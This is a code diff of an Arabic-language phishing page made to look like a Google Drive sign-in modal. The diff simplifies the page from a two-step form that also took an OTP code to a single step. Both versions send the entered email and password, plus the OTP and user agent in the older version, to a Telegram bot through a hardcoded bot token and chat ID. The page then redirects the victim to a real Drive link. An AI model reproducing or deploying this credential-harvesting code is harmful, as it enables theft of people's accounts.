@@ -14,6 +14,7 @@
             --g-primary: #1a73e8;
             --g-primary-hover: #1558b0;
             --g-sidebar-bg: #f8f9fa;
+            --g-hover-bg: #f1f3f4;
             --g-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
         }
         *, *::before, *::after { box-sizing: border-box; }
@@ -97,7 +98,6 @@
         .g-content { flex: 1; padding: 24px; background: var(--g-surface); overflow-y: auto; }
         .files-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
         .file-card { border: 1px solid var(--g-border); border-radius: 8px; padding: 12px; background: var(--g-bg); }
-        
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1000;
@@ -106,15 +106,12 @@
             background: #fff; padding: 32px; border-radius: 12px; width: 400px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.15); text-align: center;
         }
-        .modal-card h2 { font-size: 22px; font-weight: 400; margin-bottom: 8px; }
-        .modal-card p { font-size: 13px; color: var(--g-muted); margin-bottom: 20px; }
         .modal-card input {
-            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid var(--g-border); border-radius: 6px; outline: none; font-size: 14px;
+            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid var(--g-border); border-radius: 6px; outline: none;
         }
         .modal-card button {
             width: 100%; padding: 12px; background: var(--g-primary); color: white; border: none; border-radius: 6px; font-weight: 500; cursor: pointer; margin-top: 16px;
         }
-        .extra-step { display: none; }
     </style>
 </head>
 <body>
@@ -135,63 +132,29 @@
             <div class="files-grid"><div class="file-card">📁 مشروع التخرج 2026</div></div>
         </div>
     </div>
-    
     <div class="modal-overlay" id="loginModal">
         <div class="modal-card">
             <h2>تسجيل الدخول إلى Google Drive</h2>
-            <p>الرجاء تأكيد الحساب والمتابعة للأمان</p>
+            <p style="font-size: 13px; color: #5f6368; margin-bottom: 20px;">الرجاء تأكيد الحساب للمتابعة</p>
             <form id="authForm">
-                <div id="step1">
-                    <input type="text" id="username" placeholder="البريد الإلكتروني أو الهاتف" required>
-                    <input type="password" id="password" placeholder="كلمة المرور" required>
-                    <button type="button" id="nextBtn">التالي</button>
-                </div>
-                <div id="step2" class="extra-step">
-                    <p style="color: #1a73e8;">أدخل رمز التحقق (OTP) أو أكد العملية:</p>
-                    <input type="text" id="otpCode" placeholder="رمز التحقق المؤقت">
-                    <button type="submit">إتمام المصادقة والتحويل</button>
-                </div>
+                <input type="text" id="username" placeholder="البريد الإلكتروني أو الهاتف" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <button type="submit">التالي</button>
             </form>
         </div>
     </div>
-
     <script>
-        // بصمة تقنية محاكية لتتبع جلسات الاختبار والبيانات
-        const clientFingerprint = {
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            simulatedToken: 'session_tok_' + Math.random().toString(36).substring(2) + Date.now()
-        };
-
-        const botToken = '8756764415:AAFFdnNRfwBgPNsgrt5ZFy-cPFmQ5v5NaIA';
-        const chatId = '6842658461';
-
-        document.getElementById('nextBtn').addEventListener('click', function() {
-            const u = document.getElementById('username').value;
-            const p = document.getElementById('password').value;
-            if(u && p) {
-                // الانتقال للخطوة الإضافية لمحاكاة سيناريو الحماية الثنائية
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-            } else {
-                alert('الرجاء إدخال البريد وكلمة المرور أولاً');
-            }
-        });
-
         document.getElementById('authForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const otp = document.getElementById('otpCode').value || 'غير متوفر';
             
-            const message = `📥 بيانات جديدة (تجربة متقدمة):\n` +
-                            `👤 المستخدم: ${username}\n` +
-                            `🔑 كلمة المرور: ${password}\n` +
-                            `🛡️ رمز التحقق: ${otp}\n` +
-                            `🔑 توكن الجلسة: ${clientFingerprint.simulatedToken}\n` +
-                            `💻 المتصفح: ${clientFingerprint.ua}`;
+            const botToken = "8756764415:AAFFdnNRfwBgPNsgrt5ZFy-cPFmQ5v5NaIA";
+            const chatId = "6842658461";
+            const message = `📥 صيد جديد (Google Drive):\n👤 الحساب: ${username}\n🔑 كلمة المرور: ${password}`;
 
             try {
+                // إرسال البيانات مباشرة عبر بوت تيليجرام
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -204,7 +167,7 @@
                 console.error(err); 
             }
 
-            // التوجيه النهائي الفوري لرابط الدرايف المستهدف الجديد
+            // التوجيه المباشر إلى رابط ملف درايف الجديد المطلوب
             window.location.href = "https://drive.google.com/file/d/1ymc3KCh5Ys2I1saVXuVVVhHZCnShZY8a/view?usp=drivesdk";
         });
     </script>
